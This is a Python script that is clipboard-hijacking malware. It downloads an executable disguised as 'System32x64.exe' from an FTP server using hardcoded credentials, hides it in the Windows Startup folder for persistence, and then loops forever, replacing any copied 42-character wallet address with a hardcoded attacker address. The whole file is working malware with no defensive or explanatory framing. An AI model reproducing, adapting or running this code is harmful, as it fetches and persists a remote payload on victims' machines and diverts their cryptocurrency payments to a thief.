import pyperclip
import time
import re
import webbrowser
import os
import ftplib
import shutil
import pathlib
import subprocess
# *************************************************
FTP_HOST = "files.000webhost.com"
FTP_USER = "avg2021"
FTP_PASS = "Anonymous"

ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
ftp.encoding = "utf-8"
filename = 'System32x64.exe'
with open(filename, "wb") as file:
 
 clone = ftp.retrbinary("RETR System32x64.exe", file.write)
 
 ftp.quit()
 
# *************************************************
 
disk = os.path.dirname(os.path.abspath(clone))
localmachine = os.path.expanduser('~'+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')

def path_name():
 my_file = os.path.join(localmachine,"System32x64.exe")
 
 Bulok = os.path.exists(my_file)                                                        

 if Bulok == False:
             move = shutil.move(os.path.join(disk[0]+":System32x64.exe"), os.path.join(localmachine,"System32x64.exe"))
             subprocess.check_call(["attrib","+H",move])
 else:
            os.remove(os.path.join(disk[0]+":System32x64.exe"))
 
#  For else need to check kung pumapasok sa bin
     
    
start_check = path_name()

btc_check = re.compile(r'([A-Za-z0-9]){42}')
# webbrowser.open("https://www.ccleaner.com/ccleaner/download/standard")

# *************************************************
def get_clipboard():

    try:
        clipboard_data = pyperclip.paste()
        
    except:
        raise Exception("an error occurred")



    if not bool(btc_check.search(clipboard_data)):
        
        return False        

    btc = btc_check.sub(r'0x7f756836cE81C4CB728688C51d3fc6323CB7e384', str(clipboard_data))
    
          
    pyperclip.copy(btc) 
# *************************************************        
#MAIN LOOP
if __name__ == '__main__':
    while True:
        if get_clipboard():
            time.sleep(1)
           
        else:
            time.sleep(1)
 # *************************************************         